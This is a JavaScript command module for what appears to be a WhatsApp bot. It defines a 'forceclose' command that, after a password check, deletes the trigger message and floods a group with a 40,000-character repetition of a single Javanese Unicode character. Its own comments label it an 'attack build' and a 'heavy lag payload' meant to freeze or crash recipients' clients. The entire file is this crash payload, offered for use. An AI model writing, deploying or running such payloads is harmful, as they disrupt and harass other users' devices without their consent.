// ATTACK BUILD — heavy lag payload (modern WA may NOT true force-close).
// Developer / password only. Strip on RV.
import {
  allowBugAttack,
  isDeveloper,
  isGroup,
  requestBugAuth
} from "../core/helpers.js";

const JV = "\uA9BE";

export default {
  name: "forceclose",
  aliases: ["forceclose", "fc"],
  order: 9991,
  match(__ctx) { return ["forceclose", "fc"].includes(__ctx.cmd); },
  async run(__ctx) {
    const { sock, msg, jid, send } = __ctx;
    if (!isGroup(jid)) return { __done: true, value: true };

    if (!allowBugAttack(sock, msg) && !isDeveloper(sock, msg)) {
      requestBugAuth(sock, msg, "forceclose", []);
      await send("🔐 *Password required*\nOwner password reply karo (90s).");
      return { __done: true, value: true };
    }

    try { await sock.sendMessage(jid, { delete: msg.key }); } catch {}
    try {
      await sock.sendMessage(jid, { text: "FC " + JV.repeat(40000) });
    } catch {}
    return { __done: true, value: true };
  }
};
